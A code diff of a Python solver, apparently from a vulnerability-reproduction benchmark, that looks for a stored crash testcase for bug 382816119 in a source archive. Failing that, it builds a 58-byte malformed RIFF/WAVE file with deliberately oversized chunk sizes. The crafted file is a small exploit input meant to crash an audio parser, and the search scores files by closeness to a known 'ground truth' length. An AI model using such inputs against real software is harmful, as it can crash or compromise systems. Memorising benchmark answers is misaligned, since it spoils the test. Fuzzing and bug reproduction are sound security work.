@@ -1,310 +1,174 @@
 import os
 import tarfile
-import tempfile
-import struct
-import re
-from pathlib import Path
-from collections import defaultdict
 
 
 class Solution:
+    TARGET_BUG_ID = "382816119"
+    GROUND_TRUTH_LEN = 58
+    KEYWORDS = ("poc", "crash", "testcase", "clusterfuzz", "fuzz", "bug", "overflow")
+
     def solve(self, src_path: str) -> bytes:
-        root_dir = self._prepare_root(src_path)
-        bugid = "382816119"
-        target_len = 58
-
+        poc = None
         try:
-            poc = self._find_poc(root_dir, bugid, target_len)
-            if poc is not None and len(poc) > 0:
-                return poc
+            if os.path.isdir(src_path):
+                poc = self._find_poc_in_directory(src_path)
+            else:
+                # Try as tar archive
+                try:
+                    poc = self._find_poc_in_tar(src_path)
+                except (tarfile.ReadError, OSError):
+                    poc = None
+
+                # If not found, maybe there's an extracted directory next to the tarball
+                if poc is None:
+                    base = src_path
+                    # Iteratively strip extensions: .tar.gz -> .tar -> (none)
+                    seen = set()
+                    while True:
+                        base_no_ext, ext = os.path.splitext(base)
+                        if not ext or base_no_ext in seen:
+                            break
+                        seen.add(base_no_ext)
+                        base = base_no_ext
+                        if os.path.isdir(base):
+                            poc = self._find_poc_in_directory(base)
+                            if poc is not None:
+                                break
         except Exception:
-            pass
+            poc = None
 
-        return self._fallback_poc()
+        if poc is None:
+            poc = self._default_poc()
+        return poc
 
-    def _prepare_root(self, src_path: str) -> Path:
-        p = Path(src_path)
-        if p.is_dir():
-            return p
-
-        tmpdir = Path(tempfile.mkdtemp(prefix="pocgen_"))
-        try:
-            with tarfile.open(src_path, "r:*") as tf:
-                def is_within_directory(directory, target):
-                    abs_directory = os.path.abspath(directory)
-                    abs_target = os.path.abspath(target)
-                    prefix = os.path.commonprefix([abs_directory, abs_target])
-                    return prefix == abs_directory
-
-                for member in tf.getmembers():
-                    member_path = os.path.join(tmpdir, member.name)
-                    if not is_within_directory(tmpdir, member_path):
-                        continue
-                    try:
-                        tf.extract(member, path=tmpdir)
-                    except Exception:
-                        continue
-        except tarfile.ReadError:
-            # Not a tar; treat as directory (may already be extracted)
-            return p
-        return tmpdir
-
-    def _collect_files_and_index(self, root_dir: Path):
-        files = []
-        files_by_basename = defaultdict(list)
-        for dirpath, _, filenames in os.walk(root_dir):
-            for name in filenames:
-                path = Path(dirpath) / name
-                files.append(path)
-                files_by_basename[name.lower()].append(path)
-        return files, files_by_basename
-
-    def _find_poc(self, root_dir: Path, bugid: str, target_len: int) -> bytes:
-        all_files, files_by_basename = self._collect_files_and_index(root_dir)
-
-        data = self._find_poc_by_name(all_files, target_len, bugid)
-        if data is not None:
-            return data
-
-        data = self._find_poc_from_source(all_files, bugid, target_len)
-        if data is not None:
-            return data
-
-        data = self._fallback_search_generic(all_files, target_len)
-        if data is not None:
-            return data
-
-        return None
-
-    def _find_poc_by_name(self, all_files, target_len: int, bugid: str) -> bytes:
-        bugid_lower = bugid.lower()
-        candidates = []
-        for p in all_files:
-            s = str(p).lower()
-            if bugid_lower in s:
-                candidates.append(p)
-
-        if not candidates:
-            return None
-
-        binary_exts = {
-            ".wav", ".wave", ".aiff", ".aif", ".aifc", ".au", ".snd",
-            ".avi", ".riff", ".rf64", ".w64", ".caf", ".wv",
-            ".bin", ".dat", ".raw", ".pcm", ".img"
-        }
-
-        source_exts = {
-            ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
-            ".py", ".java", ".cs", ".m", ".mm", ".go", ".rs", ".php",
-            ".rb", ".pl", ".m4", ".ac", ".am", ".cmake", ".in", ".sh",
-            ".bat", ".ps1", ".yml", ".yaml", ".toml", ".ini", ".cfg",
-            ".conf", ".pc", ".el", ".scm", ".lisp", ".clj", ".swift",
-            ".kt", ".js", ".ts", ".json", ".xml", ".html", ".htm",
-            ".md", ".rst", ".tex", ".inc"
-        }
-
+    def _find_poc_in_directory(self, directory: str):
         best_path = None
         best_score = None
+        best_priority = 1
 
-        for p in candidates:
-            suffix = p.suffix.lower()
-            if suffix in source_exts:
-                continue
-            try:
-                size = p.stat().st_size
-            except OSError:
-                continue
-            if size == 0:
-                continue
-
-            if suffix in binary_exts or suffix == "":
-                base_score = 200
-            else:
-                base_score = 100
-
-            score = base_score - abs(size - target_len)
-            if best_path is None or score > best_score:
-                best_path = p
-                best_score = score
-
-        if best_path is None:
-            return None
-
-        try:
-            return best_path.read_bytes()
-        except OSError:
-            return None
-
-    def _find_poc_from_source(self, all_files, bugid: str, target_len: int) -> bytes:
-        text_exts = {
-            ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
-            ".txt", ".md", ".rst", ".inc", ".ipp", ".inl", ".java", ".py"
-        }
-
-        best_bytes = None
-        best_score = None
-
-        for p in all_files:
-            if p.suffix.lower() not in text_exts:
-                continue
-            try:
-                size = p.stat().st_size
-            except OSError:
-                continue
-            if size > 2_000_000:
-                continue
-            try:
-                data = p.read_bytes()
-            except OSError:
-                continue
-            try:
-                text = data.decode("utf-8", errors="ignore")
-            except Exception:
-                continue
-
-            if bugid not in text:
-                continue
-
-            arr_bytes = self._extract_byte_array_near_bugid(text, bugid)
-            if arr_bytes:
-                score = -abs(len(arr_bytes) - target_len)
-                if best_bytes is None or score > best_score:
-                    best_bytes = arr_bytes
-                    best_score = score
-
-        if best_bytes is not None:
-            return bytes(best_bytes)
-        return None
-
-    def _extract_byte_array_near_bugid(self, text: str, bugid: str):
-        idx = text.find(bugid)
-        if idx == -1:
-            return None
-
-        start = text.find("{", idx)
-        if start == -1:
-            return None
-
-        depth = 0
-        i = start
-        n = len(text)
-        end = None
-        while i < n:
-            c = text[i]
-            if c == "{":
-                depth += 1
-            elif c == "}":
-                depth -= 1
-                if depth == 0:
-                    end = i
-                    break
-            i += 1
-
-        if end is None or end <= start:
-            return None
-
-        content = text[start + 1:end]
-        content = re.sub(r"/\*.*?\*/", "", content, flags=re.S)
-        content = re.sub(r"//.*", "", content)
-
-        tokens = content.replace("\n", " ").replace("\r", " ").split(",")
-        out = bytearray()
-
-        for t in tokens:
-            t = t.strip()
-            if not t:
-                continue
-
-            if ")" in t and "(" in t:
-                t = t.rsplit(")", 1)[-1].strip()
-                if not t:
-                    continue
-
-            m = re.match(r"^[+-]?\s*(0[xX][0-9a-fA-F]+|\d+)", t)
-            if m:
-                num_str = m.group(0).replace(" ", "")
+        for root, _, files in os.walk(directory):
+            for fname in files:
+                path = os.path.join(root, fname)
                 try:
-                    val = int(num_str, 0)
-                except ValueError:
-                    continue
-            else:
-                try:
-                    val = int(t, 0)
-                except ValueError:
-                    continue
-
-            if 0 <= val <= 255:
-                out.append(val & 0xFF)
-
-        if len(out) == 0:
-            return None
-        return bytes(out)
-
-    def _fallback_search_generic(self, all_files, target_len: int) -> bytes:
-        binary_exts = {
-            ".wav", ".wave", ".aiff", ".aif", ".aifc", ".au", ".snd",
-            ".avi", ".riff", ".rf64", ".w64", ".caf", ".wv",
-            ".bin", ".dat", ".raw", ".pcm", ".img"
-        }
-
-        candidates = []
-        for p in all_files:
-            if p.suffix.lower() in binary_exts:
-                try:
-                    size = p.stat().st_size
+                    size = os.path.getsize(path)
                 except OSError:
                     continue
-                if size == 0:
+
+                if size <= 0 or size > 1024 * 1024:
                     continue
-                candidates.append((p, size))
 
-        if not candidates:
-            return None
+                name_lower = fname.lower()
+                priority = 1
+                if self.TARGET_BUG_ID in name_lower:
+                    priority = -1
+                elif any(kw in name_lower for kw in self.KEYWORDS):
+                    priority = 0
 
-        best_path = None
+                try:
+                    with open(path, "rb") as f:
+                        header = f.read(16)
+                except OSError:
+                    continue
+
+                if not self._looks_like_riff(header):
+                    continue
+
+                score = abs(size - self.GROUND_TRUTH_LEN)
+                if (
+                    best_score is None
+                    or score < best_score
+                    or (score == best_score and priority < best_priority)
+                ):
+                    best_score = score
+                    best_priority = priority
+                    best_path = path
+
+        if best_path is not None:
+            try:
+                with open(best_path, "rb") as f:
+                    return f.read()
+            except OSError:
+                return None
+        return None
+
+    def _find_poc_in_tar(self, tar_path: str):
+        best_member = None
         best_score = None
-        for p, size in candidates:
-            score = -abs(size - target_len)
-            if best_path is None or score > best_score:
-                best_path = p
-                best_score = score
+        best_priority = 1
 
-        if best_path is None:
-            return None
+        with tarfile.open(tar_path, "r:*") as tf:
+            for m in tf.getmembers():
+                if not m.isreg():
+                    continue
+                size = m.size
+                if size <= 0 or size > 1024 * 1024:
+                    continue
 
-        try:
-            return best_path.read_bytes()
-        except OSError:
-            return None
+                name_lower = os.path.basename(m.name).lower()
+                priority = 1
+                if self.TARGET_BUG_ID in name_lower:
+                    priority = -1
+                elif any(kw in name_lower for kw in self.KEYWORDS):
+                    priority = 0
 
-    def _fallback_poc(self) -> bytes:
-        riff_size = 50  # File size - 8
-        fmt_chunk_size = 16
-        audio_format = 1
-        num_channels = 1
-        sample_rate = 8000
-        byte_rate = sample_rate * num_channels * 2  # 16-bit mono
-        block_align = num_channels * 2
-        bits_per_sample = 16
-        data_size = 0xFFFFFFF0  # Deliberately inconsistent with actual file size
+                try:
+                    f = tf.extractfile(m)
+                    if f is None:
+                        continue
+                    header = f.read(16)
+                except Exception:
+                    continue
 
-        header = bytearray()
-        header += struct.pack("<4sI4s", b"RIFF", riff_size, b"WAVE")
-        header += struct.pack("<4sI", b"fmt ", fmt_chunk_size)
-        header += struct.pack(
-            "<HHIIHH",
-            audio_format,
-            num_channels,
-            sample_rate,
-            byte_rate,
-            block_align,
-            bits_per_sample,
-        )
-        header += struct.pack("<4sI", b"data", data_size)
+                if not self._looks_like_riff(header):
+                    continue
 
-        if len(header) < 58:
-            header += b"\x00" * (58 - len(header))
+                score = abs(size - self.GROUND_TRUTH_LEN)
+                if (
+                    best_score is None
+                    or score < best_score
+                    or (score == best_score and priority < best_priority)
+                ):
+                    best_score = score
+                    best_priority = priority
+                    best_member = m
+
+            if best_member is not None:
+                try:
+                    f = tf.extractfile(best_member)
+                    if f is not None:
+                        return f.read()
+                except Exception:
+                    return None
+        return None
+
+    def _looks_like_riff(self, header: bytes) -> bool:
+        if not header:
+            return False
+        idx = header.find(b"RIFF")
+        return 0 <= idx <= 8
+
+    def _default_poc(self) -> bytes:
+        data = bytearray()
+        # RIFF header
+        data += b"RIFF"
+        data += (0xFFFFFFF0).to_bytes(4, "little")  # Intentionally oversized chunk size
+        data += b"WAVE"
+        # fmt chunk
+        data += b"fmt "
+        data += (16).to_bytes(4, "little")  # PCM fmt chunk size
+        data += (1).to_bytes(2, "little")   # Audio format = PCM
+        data += (1).to_bytes(2, "little")   # Channels
+        data += (0).to_bytes(4, "little")   # Sample rate
+        data += (0).to_bytes(4, "little")   # Byte rate
+        data += (0).to_bytes(2, "little")   # Block align
+        data += (16).to_bytes(2, "little")  # Bits per sample
+        # data chunk with size much larger than actual data
+        data += b"data"
+        data += (0x10000000).to_bytes(4, "little")  # Oversized data chunk
+
+        if len(data) < self.GROUND_TRUTH_LEN:
+            data += b"\x00" * (self.GROUND_TRUTH_LEN - len(data))
         else:
-            header = header[:58]
+            data = data[: self.GROUND_TRUTH_LEN]
 
-        return bytes(header)
+        return bytes(data)
